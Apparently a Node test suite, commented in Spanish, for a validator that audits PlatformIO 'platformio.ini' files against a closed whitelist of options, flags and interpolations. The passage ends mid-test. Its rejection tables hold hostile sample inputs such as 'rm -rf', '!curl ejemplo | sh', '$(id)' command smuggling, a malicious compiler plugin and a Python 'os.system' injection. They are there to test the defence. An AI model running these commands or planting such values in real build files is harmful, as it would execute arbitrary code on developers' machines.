// `opencode/carga/ini.ts`: la auditoría del `platformio.ini` (Slice 2, gate único de carga —
// CONTRATOS-API §4 corregido por R-01, H-03 y la decisión del owner sobre R-04).
//
// QUÉ SE FIJA ACÁ:
//   - la tabla es CERRADA: cada opción que tiene que quedar rechazada tiene su caso, y una
//     opción que nadie conoce también se rechaza;
//   - el parser rechaza lo que no entiende con certeza (no "hace lo que puede");
//   - la gramática de flags: cada forma rechazada con su caso, y cada forma ADMITIDA con
//     una prueba POSITIVA de qué macro, y sólo esa macro, sale del tokenizador;
//   - el modo `compilacion` no admite nada que ejecute código que el modo `carga` rechace.
//
// LO QUE ESTE ARCHIVO NO PRUEBA: que PlatformIO/SCons hagan con un flag admitido lo que
// la especificación dice. Eso lo mide `tests/carga-ini-pio.test.mjs` (opt-in, compila de
// verdad). Y a propósito NO hay ningún caso que corra una variante rechazada contra el
// toolchain: por decisión del owner quedan como UNKNOWN; acá sólo se prueba que se rechazan.
//
// MUTACIONES que ponen esto rojo: ver la tabla del informe de la etapa (E2-INFORME.md).

import { test } from "node:test"
import assert from "node:assert/strict"
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs"
import { tmpdir } from "node:os"
import { dirname, join } from "node:path"
import { fileURLToPath } from "node:url"

const REPO = join(dirname(fileURLToPath(import.meta.url)), "..")
const ini = await import(join(REPO, "opencode/carga/ini.ts"))

const BASE = "[env:uno]\nplatform = atmelavr@5.2.0\nboard = uno\nframework = arduino\n"
/** BASE más una opción. Si la opción ya está en BASE (platform, board, framework), la REEMPLAZA: repetida sería otro rechazo. */
const conOpcion = (linea) => {
  const clave = linea.split("=")[0].trim()
  const base = BASE.split("\n").filter((l) => l.split("=")[0].trim() !== clave).join("\n")
  return `${base}${linea}\n`
}

/** Tiene que rechazar, con el código canónico, y nombrar esa clave con ese motivo. */
function rechaza(texto, modo, clave, motivo) {
  const r = ini.auditarTextoIni(texto, modo)
  assert.equal(r.ok, false, `tenía que rechazar (${modo}): ${JSON.stringify(texto)}`)
  assert.equal(r.codigo, "INI_NO_ADMITIDO")
  const hallado = r.rechazos.find((x) => x.clave === clave && (motivo === undefined || x.motivo === motivo))
  assert.ok(hallado, `no nombró ${clave}${motivo ? ` con ${motivo}` : ""}: ${JSON.stringify(r.rechazos)}`)
  assert.ok(r.claves.some((c) => c.includes(clave)), `claves no nombra ${clave}: ${JSON.stringify(r.claves)}`)
  return r
}

function admite(texto, modo) {
  const r = ini.auditarTextoIni(texto, modo)
  assert.equal(r.ok, true, `tenía que admitir (${modo}): ${JSON.stringify(texto)} → ${JSON.stringify(r.rechazos)}`)
  return r
}

// ── Lo que el repo usa hoy pasa ──────────────────────────────────────────────────────────

test("los ini de los ejemplos reales del repo pasan en los dos modos (menos el de verificación interna, por `-w`)", async () => {
  const { readFileSync } = await import("node:fs")
  for (const ejemplo of ["blink-esp32", "blink-uno", "servo-teclado-esp32", "servo-teclado-uno"]) {
    const texto = readFileSync(join(REPO, "ejemplos", ejemplo, "platformio.ini"), "utf8")
    for (const modo of ["compilacion", "carga"]) admite(texto, modo)
  }
  // INCOMPATIBILIDAD CONOCIDA Y DECLARADA: `build_flags = -w` no entra en la gramática.
  const interno = readFileSync(join(REPO, "ejemplos", "_test-librerias", "platformio.ini"), "utf8")
  const r = rechaza(interno, "compilacion", "build_flags", "FLAG_NO_ADMITIDO")
  assert.deepEqual(r.rechazos.map((x) => `${x.seccion}/${x.clave}`), ["env/build_flags"], "lo único que no pasa de ese ini es el `-w`")
})

test("el ini que genera el codegen para cada placa del registro pasa en los dos modos y no declara lib_deps ni flags", async () => {
  const { renderizarPlatformioIni } = await import(join(REPO, "opencode/codegen/platformio-ini.ts"))
  const placas = await import(join(REPO, "opencode/nucleo/placas.ts"))
  const registro = Object.values(placas).find((v) => v && typeof v === "object" && !Array.isArray(v) && Object.values(v).some((p) => p?.backends?.platformio))
  assert.ok(registro, "no encontré el registro de placas en nucleo/placas.ts")
  const conBackend = Object.values(registro).filter((p) => p?.backends?.platformio)
  assert.ok(conBackend.length >= 2, `esperaba al menos dos placas con backend platformio, hay ${conBackend.length}`)
  for (const placa of conBackend) {
    const { contenido, environment } = renderizarPlatformioIni(placa)
    for (const modo of ["compilacion", "carga"]) {
      const r = admite(contenido, modo)
      assert.deepEqual(r.environments, [environment])
      assert.deepEqual(r.libDeps[environment], [], "la carpeta derivada no declara lib_deps (ND-2: verificado, no supuesto)")
      assert.deepEqual(r.macros[environment], [])
      assert.deepEqual(r.advertencias, [])
    }
  }
})

// ── La tabla cerrada ─────────────────────────────────────────────────────────────────────

const RECHAZADAS_EN_ENV = [
  ["extra_scripts = pre:malo.py", "extra_scripts"],
  ["extra_script = malo.py", "extra_script"],
  ["targets = upload", "targets"],
  ["targets = size", "targets"],
  ["upload_command = rm -rf x", "upload_command"],
  ["upload_flags = -e", "upload_flags"],
  ["upload_protocol = espota", "upload_protocol"],
  ["upload_protocol = custom", "upload_protocol"],
  ["upload_protocol = esptool", "upload_protocol"],
  ["upload_resetmethod = nodemcu", "upload_resetmethod"],
  ["platform_packages = toolchain-atmelavr@file:///tmp/x", "platform_packages"],
  ["extends = env:otro", "extends"],
  ["lib_extra_dirs = /tmp/libs", "lib_extra_dirs"],
  ["src_filter = +<*>", "src_filter"],
  ["build_unflags = -DX", "build_unflags"],
  ["src_build_flags = -DX", "src_build_flags"],
  ["debug_build_flags = -O0", "debug_build_flags"],
  ["board_build.mcu = atmega2560", "board_build.mcu"],
  ["board_build.f_flash = 80000000L", "board_build.f_flash"],
  ["board_build.f_cpu = 8000000L", "board_build.f_cpu"],
  ["board_build.flash_mode = qio", "board_build.flash_mode"],
  ["board_build.partitions = huge_app.csv", "board_build.partitions"],
  ["board_build.bootloader = otro.bin", "board_build.bootloader"],
  ["board_build.arduino.custom_bootloader = x.bin", "board_build.arduino.custom_bootloader"],
  ["board_upload.offset_address = 0x20000", "board_upload.offset_address"],
  ["board_upload.flash_size = 16MB", "board_upload.flash_size"],
  ["board_upload.protocol = usbasp", "board_upload.protocol"],
  ["board_upload.extra_flags = -e", "board_upload.extra_flags"],
  ["board_upload.disable_flushing = yes", "board_upload.disable_flushing"],
  ["board_hardware.oscillator = internal", "board_hardware.oscillator"],
  ["custom_cosa = 1", "custom_cosa"],
  ["debug_tool = esp-prog", "debug_tool"],
  ["debug_server = /bin/sh", "debug_server"],
  ["debug_init_cmds = shell id", "debug_init_cmds"],
  ["test_testing_command = sh", "test_testing_command"],
  ["test_build_src = yes", "test_build_src"],
  ["check_tool = cppcheck", "check_tool"],
  ["monitor_encoding = hexlify", "monitor_encoding"],
  ["opcion_que_no_existe = 1", "opcion_que_no_existe"],
]

for (const [linea, clave] of RECHAZADAS_EN_ENV) {
  test(`tabla cerrada: \`${linea}\` se rechaza para compilar y para cargar`, () => {
    for (const modo of ["compilacion", "carga"]) {
      rechaza(conOpcion(linea), modo, clave, "OPCION_NO_ADMITIDA")
      // También si viene en la sección común [env], que heredan todos.
      rechaza(`[env]\n${linea}\n${BASE}`, modo, clave, "OPCION_NO_ADMITIDA")
    }
  })
}

const DIRS = ["core_dir", "globallib_dir", "platforms_dir", "packages_dir", "cache_dir", "build_cache_dir", "workspace_dir", "build_dir", "libdeps_dir", "include_dir", "src_dir", "lib_dir", "data_dir", "test_dir", "boards_dir", "monitor_dir", "shared_dir"]

test("[platformio]: sólo default_envs, name y description; las 17 carpetas y extra_configs se rechazan", () => {
  for (const clave of [...DIRS, "extra_configs"]) {
    for (const modo of ["compilacion", "carga"]) rechaza(`[platformio]\n${clave} = otra\n${BASE}`, modo, clave, "OPCION_NO_ADMITIDA")
  }
  admite(`[platformio]\ndefault_envs = uno\nname = Semaforo\ndescription = Tres leds y un pulsador\n${BASE}`, "carga")
  // Una opción de [env] no vale en [platformio], ni al revés.
  rechaza(`[platformio]\nboard = uno\n${BASE}`, "carga", "board", "OPCION_NO_ADMITIDA")
  rechaza(conOpcion("default_envs = uno"), "carga", "default_envs", "OPCION_NO_ADMITIDA")
})

test("una clave heredada de Object.prototype no pasa por estar en el objeto de reglas", () => {
  // `tostring`, `valueof`... no existen en minúsculas en Object.prototype; `constructor` sí.
  // Sin el chequeo de clave propia, `reglas["constructor"]` es una función y la auditoría
  // revienta en vez de rechazar: por eso se afirma PRIMERO que no tira.
  for (const clave of ["constructor", "tostring", "valueof"]) {
    let r
    assert.doesNotThrow(() => (r = ini.auditarTextoIni(conOpcion(`${clave} = 1`), "compilacion")), `la auditoría tiró con la clave ${clave}`)
    assert.equal(r.ok, false)
    assert.deepEqual(r.rechazos.map((x) => [x.clave, x.motivo]), [[clave, "OPCION_NO_ADMITIDA"]])
  }
})

const VALORES_MALOS = [
  ["platform = https://github.com/x/plataforma.git", "platform"],
  ["platform = plataforma-de-otro", "platform"],
  ["platform = atmelavr@^5.0.0", "platform"],
  ["platform = espressif32 @ 6.12.0", "platform"],
  ["platform = file:///tmp/plataforma", "platform"],
  ["board = ../otra", "board"],
  ["board = uno otra", "board"],
  ["framework = espidf", "framework"],
  ["framework = arduino, espidf", "framework"],
  ["monitor_speed = 9600; rm", "monitor_speed"],
  ["monitor_speed = 0115200", "monitor_speed"],
  ["upload_speed = rapido", "upload_speed"],
  ["upload_port = 192.168.1.50", "upload_port"],
  ["upload_port = placa.local", "upload_port"],
  ["monitor_port = socket://10.0.0.1:23", "monitor_port"],
  ["monitor_filters = mi_filtro", "monitor_filters"],
  ["monitor_filters = default, filter_malo", "monitor_filters"],
  ["monitor_eol = XX", "monitor_eol"],
  ["monitor_rts = 2", "monitor_rts"],
  ["build_type = debug", "build_type"],
  ["build_type = test", "build_type"],
  ["lib_ldf_mode = raro", "lib_ldf_mode"],
  ["lib_archive = quizas", "lib_archive"],
  ["lib_ignore = ../x", "lib_ignore"],
  ["lib_deps = https://github.com/x/y.git", "lib_deps"],
  ["lib_deps = git+https://github.com/x/y", "lib_deps"],
  ["lib_deps = file:///tmp/lib", "lib_deps"],
  ["lib_deps = symlink:///tmp/lib", "lib_deps"],
  ["lib_deps = Servo", "lib_deps"],
  ["lib_deps = nombre=https://x/y.zip", "lib_deps"],
  ["lib_deps = ../otra/lib", "lib_deps"],
  ["lib_deps = /tmp/lib", "lib_deps"],
  ["lib_deps = a/b, c/d", "lib_deps"],
  ["lib_deps = adafruit/DHT sensor library@>=1.0", "lib_deps"],
  ["lib_deps = a/b@1.0.0#rama", "lib_deps"],
]

for (const [linea, clave] of VALORES_MALOS) {
  test(`valor fuera de forma: \`${linea}\` se rechaza en los dos modos`, () => {
    for (const modo of ["compilacion", "carga"]) rechaza(conOpcion(linea), modo, clave, "VALOR_NO_ADMITIDO")
  })
}

test("cada opción admitida pasa con un valor de la forma prevista (y la tabla publicada es la que se aplica)", () => {
  const ejemplos = {
    platform: "espressif32@6.12.0", board: "esp32dev", framework: "arduino", monitor_speed: "115200", upload_speed: "921600",
    upload_port: "/dev/ttyUSB0", monitor_port: "COM5", monitor_eol: "CRLF", monitor_parity: "N", monitor_raw: "yes", monitor_echo: "no",
    monitor_rts: "0", monitor_dtr: "0", monitor_filters: "default, time, esp32_exception_decoder", build_type: "release",
    lib_deps: "adafruit/DHT sensor library@^1.4.4", lib_ignore: "Servo", lib_ldf_mode: "chain+", lib_compat_mode: "soft", lib_archive: "no",
    build_flags: "-D LED=4", build_src_flags: "-DMODO_AULA", build_src_filter: "+<*> -<viejo/>",
  }
  const tabla = ini.tablaDeOpciones()
  const deEnv = tabla.admitidas.filter((f) => f.seccion === "env")
  assert.deepEqual(deEnv.map((f) => f.clave).sort(), Object.keys(ejemplos).sort(), "la tabla admitida cambió: hay que revisar este test, el informe y el porqué de la opción nueva")
  assert.deepEqual(tabla.admitidas.filter((f) => f.seccion === "platformio").map((f) => f.clave).sort(), ["default_envs", "description", "name"])
  for (const [clave, valor] of Object.entries(ejemplos)) {
    const texto = `[env:x]\n${clave} = ${valor}\n`
    admite(texto, "compilacion")
    const fila = deEnv.find((f) => f.clave === clave)
    if (fila.soloCompilacion) rechaza(texto, "carga", clave, "OPCION_NO_ADMITIDA")
    else admite(texto, "carga")
  }
  assert.deepEqual(deEnv.filter((f) => f.soloCompilacion).map((f) => f.clave), ["build_src_filter"], "lo único que el modo compilación admite de más es build_src_filter")
})

test("build_src_filter: se admite sólo para compilar, con advertencia; para cargar se rechaza; y nunca sale de src/", () => {
  const r = admite(conOpcion("build_src_filter = +<*> -<viejo/>"), "compilacion")
  assert.equal(r.advertencias.length, 1)
  assert.match(r.advertencias[0], /build_src_filter/)
  rechaza(conOpcion("build_src_filter = +<*> -<viejo/>"), "carga", "build_src_filter", "OPCION_NO_ADMITIDA")
  for (const malo of ["+<../otro/>", "+</etc/>", "+<*>;x", "*", "+<a b>", "+<$HOME>"]) {
    const res = ini.auditarTextoIni(conOpcion(`build_src_filter = ${malo}`), "compilacion")
    assert.equal(res.ok, false, `tenía que rechazar el filtro ${malo}`)
  }
})

test("SEPARACIÓN compilación/carga: todo lo que el modo carga rechaza por ejecutar código, el modo compilación también", () => {
  // Para cada línea de las dos listas de arriba, los dos modos coinciden. Lo ÚNICO que
  // el modo compilación admite de más es build_src_filter, que no ejecuta nada.
  for (const [linea] of [...RECHAZADAS_EN_ENV, ...VALORES_MALOS]) {
    const c = ini.auditarTextoIni(conOpcion(linea), "compilacion")
    const g = ini.auditarTextoIni(conOpcion(linea), "carga")
    assert.equal(c.ok, false, `compilación admitió: ${linea}`)
    assert.equal(g.ok, false, `carga admitió: ${linea}`)
  }
  assert.equal(ini.auditarTextoIni(BASE, "otro-modo").ok, false, "un modo desconocido no es 'el más laxo'")
  assert.equal(ini.auditarTextoIni(BASE, undefined).ok, false)
})

// ── Flags (R-04) ─────────────────────────────────────────────────────────────────────────

const FLAGS_RECHAZADOS = [
  "!echo -DX",
  "! echo hola",
  "-DX !id",
  "@archivo.txt",
  "-DX=$HOME",
  "-DX=${sysenv.HOME}",
  "-DX=$(id)",
  "-DX=`id`",
  '-DX="a b"',
  "-DX='a'",
  '-D"X"',
  "-DX=a\\ b",
  "-DX=1;id",
  "-DX=1 ; id",
  "-DX=a,b",
  "-DX=1.5",
  "-DX=010",
  "-DX=0x",
  "-DX=-1",
  "-DX=a=b",
  "-DX=",
  "-D",
  "-D -DX",
  "-Dx",
  "-D_X",
  "-D1X",
  "-DÑ",
  "-DX=ñ",
  "-DX -DX",
  "-DX=1 -D X=2",
  "-I/tmp/inc",
  "-Iinclude",
  "-include malo.h",
  "-imacros malo.h",
  "-O3",
  "-Os",
  "-w",
  "-Wall",
  "-Wl,--wrap=main",
  "-Wp,-MD,/tmp/x",
  "-std=gnu++17",
  "-fno-exceptions",
  "-lm",
  "-L/tmp",
  "-U X",
  "-UX",
  "-x c",
  "-specs=nano.specs",
  "-fplugin=./malo.so",
  "-B/tmp",
  "--param x=1",
  "+Olibcalls",
  "libmala.a",
  "-DX\t-I.",
  "-D X=1 extra",
]

for (const flag of FLAGS_RECHAZADOS) {
  test(`flags: \`${flag.replace(/\t/g, "\\t")}\` se rechaza en build_flags y en build_src_flags, en los dos modos`, () => {
    assert.equal(ini.leerFlags([flag]).ok, false, `leerFlags admitió ${JSON.stringify(flag)}`)
    // Dentro de un ini: `;` con espacio adelante y `#` son comentario para PlatformIO. Lo
    // que se audita es lo que queda; si lo que queda es un flag admitido, no hay nada que rechazar.
    const visible = flag.replace(/(^|[ \t])[;#].*$/, "")
    for (const clave of ["build_flags", "build_src_flags"]) {
      for (const modo of ["compilacion", "carga"]) {
        const r = ini.auditarTextoIni(conOpcion(`${clave} = ${flag}`), modo)
        if (ini.leerFlags([visible]).ok && visible.trim() !== "") continue
        assert.equal(r.ok, false, `${modo} admitió ${clave} = ${JSON.stringify(flag)}`)
      }
    }
  })
}

test("flags: la primera barrera es el ALFABETO — un carácter de fuera corta ahí, antes de mirar la forma", () => {
  // El resto de las reglas también rechazaría estos casos; se afirma que los frena la
  // primera (por su mensaje), para que nadie la saque creyendo que sobra.
  for (const flag of ["!id", "-DX !id", "@archivo", "-DX=$Y", '-DX="a"', "-DX='a'", "-DX=a\\b", "-DX=1;id", "-DX=a,b", "-DX=1.5", "-I/tmp", "-DX=(1)", "-DX=a:b", "-DX=1+1", "-DX=\u00f1"]) {
    const r = ini.leerFlags([flag])
    assert.equal(r.ok, false, flag)
    assert.match(r.detalle, /carácter fuera de letras/, `${flag}: lo frenó otra regla (${r.detalle})`)
    assert.equal(r.flag, flag)
  }
  assert.equal(ini.leerFlags([7]).ok, false)
  assert.equal(ini.leerFlags([null]).ok, false)
})

test("flags: el `!` se rechaza en CUALQUIER línea del valor y también después de expandir ${env.build_flags}", () => {
  rechaza(conOpcion("build_flags =\n  -DX=1\n  !curl ejemplo | sh"), "compilacion", "build_flags", "FLAG_NO_ADMITIDO")
  rechaza(conOpcion("build_flags =\n  !id\n  -DX=1"), "carga", "build_flags", "FLAG_NO_ADMITIDO")
  // El `!` viene de [env] y entra por la interpolación: se rechaza en [env] Y en quien lo interpola.
  const r = ini.auditarTextoIni(`[env]\nbuild_flags = !id\n${BASE}build_flags = \${env.build_flags} -DX\n`, "compilacion")
  assert.equal(r.ok, false)
  assert.deepEqual(r.rechazos.map((x) => x.seccion).sort(), ["env", "env:uno"])
})

test("flags: un `-D` al final de una línea NO se completa con la línea siguiente (SCons parsea cada línea aparte)", () => {
  rechaza(conOpcion("build_flags =\n  -D\n  LED=4"), "compilacion", "build_flags", "FLAG_NO_ADMITIDO")
  const r = ini.leerFlags(["-D", "LED=4"])
  assert.equal(r.ok, false)
})

// PRUEBAS POSITIVAS: para cada forma admitida, qué macro sale — exactamente esa y ninguna otra.
const FLAGS_ADMITIDOS = [
  ["-DLED", [{ nombre: "LED", valor: null }]],
  ["-D LED", [{ nombre: "LED", valor: null }]],
  ["-DLED=4", [{ nombre: "LED", valor: "4" }]],
  ["-D LED=4", [{ nombre: "LED", valor: "4" }]],
  ["-D  LED=4", [{ nombre: "LED", valor: "4" }]],
  ["-DLED=0", [{ nombre: "LED", valor: "0" }]],
  ["-DPERIODO_MS=1500", [{ nombre: "PERIODO_MS", valor: "1500" }]],
  ["-DMASCARA=0x1F", [{ nombre: "MASCARA", valor: "0x1F" }]],
  ["-DMASCARA=0Xff", [{ nombre: "MASCARA", valor: "0Xff" }]],
  ["-DMODO=RAPIDO", [{ nombre: "MODO", valor: "RAPIDO" }]],
  ["-DMODO=modo_lento2", [{ nombre: "MODO", valor: "modo_lento2" }]],
  ["-DA=1 -DB=2", [{ nombre: "A", valor: "1" }, { nombre: "B", valor: "2" }]],
  ["-DA=1\t-D B", [{ nombre: "A", valor: "1" }, { nombre: "B", valor: null }]],
  ["-DEBUG", [{ nombre: "EBUG", valor: null }]],
  ["", []],
]

for (const [flag, esperado] of FLAGS_ADMITIDOS) {
  test(`flags, prueba positiva: \`${flag.replace(/\t/g, "\\t")}\` es exactamente ${JSON.stringify(esperado)}`, () => {
    const r = ini.leerFlags([flag])
    assert.equal(r.ok, true, JSON.stringify(r))
    assert.deepEqual(r.definiciones, esperado)
    if (flag === "") return
    // Y lo mismo cuando viene dentro de un ini: lo que la auditoría informa es esa macro, sola.
    for (const clave of ["build_flags", "build_src_flags"]) {
      const a = admite(conOpcion(`${clave} = ${flag}`), "compilacion")
      assert.deepEqual(a.macros.uno, esperado)
    }
  })
}

test("flags, prueba positiva: varias líneas dan una lista en orden, y el valor llega con el MISMO texto que se escribió", () => {
  const r = admite(conOpcion("build_flags =\n  -DLED=4      ; el led\n  -D BOTON=15\n  -DMODO=AULA\nbuild_src_flags = -DSOLO_SRC=1"), "compilacion")
  assert.deepEqual(r.macros.uno, [
    { nombre: "LED", valor: "4" },
    { nombre: "BOTON", valor: "15" },
    { nombre: "MODO", valor: "AULA" },
    { nombre: "SOLO_SRC", valor: "1" },
  ])
  // La forma canónica de cada una es `-DNOMBRE` o `-DNOMBRE=valor`, sin nada más.
  for (const d of r.macros.uno) assert.match(d.valor === null ? `-D${d.nombre}` : `-D${d.nombre}=${d.valor}`, /^-D[A-Z][A-Z0-9_]*(=[A-Za-z0-9_]+)?$/)
})

test("flags: ${env.build_flags} se expande y el resultado se audita ENTERO; lo que hereda un environment es lo de [env]", () => {
  const texto = `[env]\nbuild_flags = -DCOMUN=1\n[env:uno]\nboard = uno\nbuild_flags =\n  \${env.build_flags}\n  -DPROPIO=2\n[env:esp32dev]\nboard = esp32dev\n`
  const r = admite(texto, "compilacion")
  assert.deepEqual(r.macros.uno, [{ nombre: "COMUN", valor: "1" }, { nombre: "PROPIO", valor: "2" }])
  assert.deepEqual(r.macros.esp32dev, [{ nombre: "COMUN", valor: "1" }], "sin build_flags propio, vale el de [env]")
  // Pegado a un valor: el resultado tiene que seguir siendo un flag admitido.
  rechaza(`[env]\nbuild_flags = -DA=1\n[env:uno]\nboard = uno\nbuild_flags = -DX=\${env.build_flags}\n`, "compilacion", "build_flags", "FLAG_NO_ADMITIDO")
  // Repetida después de expandir.
  rechaza(`[env]\nbuild_flags = -DA=1\n[env:uno]\nboard = uno\nbuild_flags = \${env.build_flags} -DA=2\n`, "compilacion", "build_flags", "FLAG_NO_ADMITIDO")
})

// ── Interpolaciones ──────────────────────────────────────────────────────────────────────

const INTERPOLACIONES_MALAS = [
  ["build_flags = -DX=${sysenv.HOME}", "build_flags"],
  ["lib_deps = ${sysenv.LIBS}", "lib_deps"],
  ["board = ${sysenv.PLACA}", "board"],
  ["upload_port = ${sysenv.PUERTO}", "upload_port"],
  ["build_flags = ${this.board}", "build_flags"],
  ["build_flags = ${env:otro.build_flags}", "build_flags"],
  ["build_flags = ${env.lib_deps}", "build_flags"],
  ["build_flags = ${platformio.name}", "build_flags"],
  ["build_flags = -DX=${PROJECT_DIR}", "build_flags"],
  ["build_flags = -DX=$PROJECT_HASH", "build_flags"],
  ["build_flags = ${UNIX_TIME}", "build_flags"],
  ["build_flags = ${__import__('os').system('id')}", "build_flags"],
  ["board = ${env.board}", "board"],
  ["monitor_speed = $VELOCIDAD", "monitor_speed"],
  ["lib_deps = ${env.lib_deps}", "lib_deps"],
]

for (const [linea, clave] of INTERPOLACIONES_MALAS) {
  test(`interpolación no admitida: \`${linea}\``, () => {
    for (const modo of ["compilacion", "carga"]) rechaza(conOpcion(linea), modo, clave, "INTERPOLACION_NO_ADMITIDA")
  })
}

test("interpolación: sólo las opciones que la admiten — `board = ${env.board}` se rechaza AUNQUE [env] defina board", () => {
  for (const [clave, valor] of [["board", "uno"], ["platform", "atmelavr"], ["monitor_speed", "9600"], ["upload_port", "COM5"], ["framework", "arduino"]]) {
    rechaza(`[env]\n${clave} = ${valor}\n[env:x]\n${clave} = \${env.${clave}}\n`, "compilacion", clave, "INTERPOLACION_NO_ADMITIDA")
  }
})

test("interpolación: `${env.K}` sólo dentro de K — con otra opción se rechaza aunque las dos estén definidas en [env]", () => {
  const comun = "[env]\nbuild_flags = -DA=1\nbuild_src_flags = -DB=2\nlib_deps = a/b\n"
  rechaza(`${comun}[env:x]\nboard = uno\nbuild_flags = \${env.lib_deps}\n`, "compilacion", "build_flags", "INTERPOLACION_NO_ADMITIDA")
  rechaza(`${comun}[env:x]\nboard = uno\nbuild_flags = \${env.build_src_flags}\n`, "compilacion", "build_flags", "INTERPOLACION_NO_ADMITIDA")
  rechaza(`${comun}[env:x]\nboard = uno\nlib_deps = \${env.build_flags}\n`, "compilacion", "lib_deps", "INTERPOLACION_NO_ADMITIDA")
  admite(`${comun}[env:x]\nboard = uno\nbuild_flags = \${env.build_flags}\n`, "compilacion")
})

test("interpolación: `${env.K}` sin K en [env] se rechaza diciendo que no está definido (no se expande a nada)", () => {
  const r = rechaza(conOpcion("lib_deps = ${env.lib_deps}"), "compilacion", "lib_deps", "INTERPOLACION_NO_ADMITIDA")
  assert.match(r.rechazos[0].detalle, /no está definido en \[env\]/)
  const f = rechaza(conOpcion("build_flags = -DX ${env.build_flags}"), "compilacion", "build_flags", "INTERPOLACION_NO_ADMITIDA")
  assert.match(f.rechazos[0].detalle, /no está definido en \[env\]/)
})

test("interpolación: en [env] no se admite ningún `$`, ni una referencia a sí misma ni en cadena", () => {
  rechaza(`[env]\nlib_deps = \${env.lib_deps}\n${BASE}`, "compilacion", "lib_deps", "INTERPOLACION_NO_ADMITIDA")
  rechaza(`[env]\nbuild_flags = -DX=\${sysenv.Y}\n${BASE}`, "compilacion", "build_flags", "INTERPOLACION_NO_ADMITIDA")
  const r = ini.auditarTextoIni(`[env]\nbuild_flags = \${env.build_flags}\n${BASE}build_flags = \${env.build_flags}\n`, "compilacion")
  assert.equal(r.ok, false)
  assert.ok(r.rechazos.every((x) => x.motivo === "INTERPOLACION_NO_ADMITIDA"), JSON.stringify(r.rechazos))
  assert.equal(r.rechazos.length, 2)
})

test("interpolación admitida: lib_deps = ${env.lib_deps} + una propia (el patrón de los proyectos con dos placas)", () => {
  const texto = `[env]\nframework = arduino\nlib_deps =\n    adafruit/DHT sensor library         ; sensor\n    chris--a/Keypad\n[env:uno]\nboard = uno\nlib_deps =\n    \${env.lib_deps}\n    arduino-libraries/Servo\n[env:esp32dev]\nboard = esp32dev\n`
  const r = admite(texto, "carga")
  assert.deepEqual(r.libDeps.uno, ["adafruit/DHT sensor library", "chris--a/Keypad", "arduino-libraries/Servo"])
  assert.deepEqual(r.libDeps.esp32dev, ["adafruit/DHT sensor library", "chris--a/Keypad"])
})

// ── El parser ────────────────────────────────────────────────────────────────────────────

const NO_ENTENDIDOS = [
  ["sección desconocida", "[common]\nx = 1\n" + BASE, "SECCION_NO_ADMITIDA"],
  ["sección DEFAULT de configparser", "[DEFAULT]\nextra_scripts = x.py\n" + BASE, "SECCION_NO_ADMITIDA"],
  ["nombre de environment con espacio", "[env:mi placa]\nboard = uno\n", "SECCION_NO_ADMITIDA"],
  ["nombre de environment con barra", "[env:../x]\nboard = uno\n", "SECCION_NO_ADMITIDA"],
  ["cabecera con basura detrás", "[env:uno] x\nboard = uno\n", "SECCION_NO_ADMITIDA"],
  ["cabecera con corchete de más", "[env:uno]]\nboard = uno\n", "SECCION_NO_ADMITIDA"],
  ["cabecera en mayúsculas", "[ENV:uno]\nboard = uno\n", "SECCION_NO_ADMITIDA"],
  ["sección repetida", BASE + "[env:uno]\nmonitor_speed = 9600\n", "SECCION_REPETIDA"],
  ["clave repetida", BASE + "board = esp32dev\n", "CLAVE_REPETIDA"],
  ["opción antes de la primera sección", "board = uno\n" + BASE, "LINEA_NO_ENTENDIDA"],
  ["línea suelta que no es clave = valor", BASE + "esto no es nada\n", "LINEA_NO_ENTENDIDA"],
  ["separador `:` (configparser lo admite)", BASE + "extra_scripts: malo.py\n", "LINEA_NO_ENTENDIDA"],
  ["clave con espacio", BASE + "extra scripts = malo.py\n", "LINEA_NO_ENTENDIDA"],
  ["clave en mayúsculas (configparser la baja a minúsculas)", BASE + "EXTRA_SCRIPTS = malo.py\n", "LINEA_NO_ENTENDIDA"],
  ["clave sin valor ni `=`", BASE + "extra_scripts\n", "LINEA_NO_ENTENDIDA"],
  ["línea con sangría después de una cabecera", "[env:uno]\n  board = uno\n", "LINEA_NO_ENTENDIDA"],
  ["`%` (interpolación de configparser)", BASE + "monitor_speed = %(x)s\n", "CARACTER_NO_ADMITIDO"],
  ["carácter no ASCII en un valor", BASE + "board = uño\n", "CARACTER_NO_ADMITIDO"],
  ["espacio duro antes de un `;`", BASE + "board = uno\u00a0; x\n", "CARACTER_NO_ADMITIDO"],
  ["byte nulo", BASE + "board = uno\u0000\n", "CARACTER_NO_ADMITIDO"],
  ["salto de página", BASE + "\u000cextra_scripts = x.py\n", "CARACTER_NO_ADMITIDO"],
  ["BOM al principio", "\ufeff" + BASE, "CARACTER_NO_ADMITIDO"],
  ["separador de línea Unicode en un comentario", BASE + "; nota\u2028extra_scripts = x.py\n", "CARACTER_NO_ADMITIDO"],
  ["carácter de reemplazo (bytes que no eran UTF-8)", BASE + "; nota \ufffd\n", "CARACTER_NO_ADMITIDO"],
]

for (const [nombre, texto, motivo] of NO_ENTENDIDOS) {
  test(`parser, lo que no se entiende con certeza se rechaza: ${nombre}`, () => {
    const p = ini.parsearIni(texto)
    assert.equal(p.ok, false, `parsearIni lo dio por bueno: ${JSON.stringify(texto)}`)
    assert.ok(p.rechazos.some((r) => r.motivo === motivo), `esperaba ${motivo}: ${JSON.stringify(p.rechazos)}`)
    for (const modo of ["compilacion", "carga"]) {
      const r = ini.auditarTextoIni(texto, modo)
      assert.equal(r.ok, false)
      assert.equal(r.codigo, "INI_NO_ADMITIDO")
    }
  })
}

test("parser: un `\\r` suelto ES un salto de línea (así lo lee Python): no esconde una opción en un valor", () => {
  const p = ini.parsearIni("[env:uno]\nboard = uno\rextra_scripts = malo.py\n")
  assert.equal(p.ok, true)
  assert.deepEqual([...p.ini.secciones.get("env:uno").keys()], ["board", "extra_scripts"])
  rechaza("[env:uno]\nboard = uno\rextra_scripts = malo.py\n", "compilacion", "extra_scripts", "OPCION_NO_ADMITIDA")
  rechaza("[env:uno]\r\nboard = uno\r\nextra_scripts = malo.py\r\n", "compilacion", "extra_scripts", "OPCION_NO_ADMITIDA")
})

test("parser: una línea con sangría continúa el valor — una opción 'escondida' con sangría es parte del valor y lo invalida", () => {
  const p = ini.parsearIni("[env:uno]\nboard = uno\n  extra_scripts = malo.py\n")
  assert.equal(p.ok, true)
  assert.deepEqual(p.ini.secciones.get("env:uno").get("board").lineas, ["uno", "extra_scripts = malo.py"])
  rechaza("[env:uno]\nboard = uno\n  extra_scripts = malo.py\n", "compilacion", "board", "VALOR_NO_ADMITIDO")
  // Y una cabecera con sangría también es valor, no una sección nueva.
